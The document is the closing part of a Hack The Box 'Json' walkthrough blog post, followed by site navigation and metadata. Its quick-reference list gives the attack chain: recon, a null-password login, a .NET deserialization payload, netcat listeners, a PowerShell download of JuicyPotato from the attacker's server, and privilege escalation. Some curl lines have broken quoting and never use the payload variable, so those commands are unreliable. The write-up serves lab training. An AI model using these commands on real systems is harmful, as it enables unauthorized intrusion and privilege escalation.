+<p>We couldn't use ysoserial.net's <code>WindowsIdentity</code> gadget because our Linux host lacked Windows assemblies. Instead of giving up, we manually constructed the <code>ObjectDataProvider</code> JSON payload. The tool was a convenience, not a requirement. <strong>Understand the vulnerability, not just the tool.</strong></p>
+<hr />
+<h2 id="quick-reference-all-commands">Quick Reference: All Commands</h2>
+<pre><code class="language-bash" data-language="bash"># Recon
+nmap -sC -sV -p- --min-rate 10000 10.129.227.191 -oN nmap_json
+
+# Login
+curl -i -X POST -H "Content-Type: application/json" -d '{"UserName":"admin","Password":null}' http://10.129.227.191/api/token
+
+# Verify deserialization
+curl -i -X GET -H "Bearer: null -H "Cookie: null http://10.129.227.191/api/Account/
+
+# Generate payload
+python3 gen_payload.py
+
+# Send payload
+PAYLOAD=$(python3 gen_payload.py)
+curl -i -X GET -H "Bearer: null -H "Cookie: null http://10.129.227.191/api/Account/
+
+# Start listeners
+python3 -m http.server 8080 &amp;
+nc -lnvp 4444
+nc -lnvp 5555
+
+# Privesc
+IEX(New-Object Net.WebClient).downloadFile('http://10.10.16.84:8080/JuicyPotato.exe', 'C:\Windows\Temp\jp.exe')
+C:\Windows\Temp\jp.exe -t * -p C:\Windows\Temp\rev2.bat -l 1337 -c "{e60687f7-01a1-40aa-86ac-db1cbf673334}"
+
+# Flags
+type C:\Users\userpool\Desktop\user.txt
+type C:\Users\superadmin\Desktop\root.txt
+</code></pre>
+<hr />
+<p><em>Happy hacking. Understand the why, not just the how.</em></p>
+8:["$","div",null,{"className":"article-prose","dangerouslySetInnerHTML":{"__html":"$d"}}]
+9:["$","nav",null,{"className":"article-pagination shell","aria-label":"Writing archive navigation","children":[["$","div",null,{"children":["$","$L2",null,{"href":"/writing/hackthebox-jobtwo-walkthrough","children":[["$","span",null,{"children":"Newer article"}],["$","strong",null,{"children":"Hack The Box: JobTwo Walkthrough"}]]}]}],["$","$L2",null,{"className":"article-pagination-index","href":"/writing","children":["All ",114," articles"]}],["$","div",null,{"children":["$","$L2",null,{"href":"/writing/hackthebox-kryptos-walkthrough","children":[["$","span",null,{"children":"Older article"}],["$","strong",null,{"children":"Hack The Box: Kryptos Walkthrough"}]]}]}]]}]
+a:["$","footer",null,{"className":"site-footer","children":[["$","div",null,{"className":"shell footer-main","children":[["$","div",null,{"children":[["$","$L2",null,{"className":"brand footer-brand","href":"/","children":[["$","span",null,{"className":"brand-mark","aria-hidden":"true","children":"CK"}],["$","span",null,{"children":"CyberKareem"}]]}],["$","p",null,{"children":"Abdullah Kareem · Security Researcher and Penetration Tester"}]]}],["$","div",null,{"className":"footer-link-groups","children":[["$","nav",null,{"className":"footer-site-nav","aria-label":"Site pages","children":[["$","$L2","Research",{"href":"/research","children":"Research"}],["$","$L2","Services",{"href":"/services","children":"Services"}],["$","$L2","Writing",{"href":"/writing","children":"Writing"}],["$","$L2","Projects",{"href":"/projects","children":"Projects"}],["$","$L2","About",{"href":"/about","children":"About"}],["$","$L2","Contact",{"href":"/contact","children":"Contact"}],["$","$L2","Policies",{"href":"/policies","children":"Policies"}]]}],["$","nav",null,{"className":"social-links","aria-label":"Public profiles","children":[["$","a","LinkedIn",{"href":"https://www.linkedin.com/in/cyberkareem/","target":"_blank","rel":"noreferrer","children":["LinkedIn"," ",["$","span",null,{"aria-hidden":"true","children":"↗"}],["$","span",null,{"className":"sr-only","children":" opens in a new tab"}]]}],["$","a","GitHub",{"href":"https://github.com/CyberKareem","target":"_blank","rel":"noreferrer","children":["GitHub"," ",["$","span",null,{"aria-hidden":"true","children":"↗"}],["$","span",null,{"className":"sr-only","children":" opens in a new tab"}]]}],["$","a","X",{"href":"https://x.com/cyberkareem","target":"_blank","rel":"noreferrer","children":["X"," ",["$","span",null,{"aria-hidden":"true","children":"↗"}],["$","span",null,{"className":"sr-only","children":" opens in a new tab"}]]}],["$","a","Hack The Box",{"href":"https://app.hackthebox.com/public/users/349278","target":"_blank","rel":"noreferrer","children":["Hack The Box"," ",["$","span",null,{"aria-hidden":"true","children":"↗"}],["$","span",null,{"className":"sr-only","children":" opens in a new tab"}]]}],["$","a","Credential wallet",{"href":"https://www.credential.net/profile/cyberkareem/wallet","target":"_blank","rel":"noreferrer","children":["Credential wallet"," ",["$","span",null,{"aria-hidden":"true","children":"↗"}],["$","span",null,{"className":"sr-only","children":" opens in a new tab"}]]}],["$","a","Credly",{"href":"https://www.credly.com/users/cyberkareem/badges","target":"_blank","rel":"noreferrer","children":["Credly"," ",["$","span",null,{"aria-hidden":"true","children":"↗"}],["$","span",null,{"className":"sr-only","children":" opens in a new tab"}]]}]]}]]}]]}],["$","div",null,{"className":"shell footer-bottom","children":[["$","span",null,{"children":"© 2026 Abdullah Kareem"}],["$","span",null,{"children":"Evidence-led research · authorized assessment"}],["$","$L2",null,{"href":"/services","children":"Explore security services →"}]]}]]}]
+e:T504,{"@context":"https://schema.org","@graph":[{"@type":"BlogPosting","@id":"https://cyberkareem.com/writing/hackthebox-json-walkthrough/#article","headline":"Hack The Box: Json Walkthrough","description":"An archived walkthrough of the retired Hack The Box Json machine, preserved from Abdullah Kareem's OSWE Prep preparation notes.","url":"https://cyberkareem.com/writing/hackthebox-json-walkthrough/","datePublished":"2026-06-11T12:59:45.000Z","dateModified":"2026-07-12T00:00:00.000Z","wordCount":2594,"articleSection":"Hack The Box","isBasedOn":"https://github.com/CyberKareem/OSWE-Prep/blob/aef7c23f8b2ffb00279a48835b95b50f4b06e2ff/HTB-Json.md","author":{"@id":"https://cyberkareem.com/#person"},"publisher":{"@id":"https://cyberkareem.com/#person"},"image":"https://cyberkareem.com/writing/covers/hackthebox-json-walkthrough.webp","mainEntityOfPage":"https://cyberkareem.com/writing/hackthebox-json-walkthrough/"},{"@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"name":"Home","item":"https://cyberkareem.com/"},{"@type":"ListItem","position":2,"name":"Writing","item":"https://cyberkareem.com/writing/"},{"@type":"ListItem","position":3,"name":"Hack The Box: Json Walkthrough","item":"https://cyberkareem.com/writing/hackthebox-json-walkthrough/"}]}]}b:["$","script",null,{"type":"application/ld+json","dangerouslySetInnerHTML":{"__html":"$e"}}]
+c:["$","$Lf",null,{"children":["$","$10",null,{"name":"Next.MetadataOutlet","children":"$@11"}]}]
+11:null
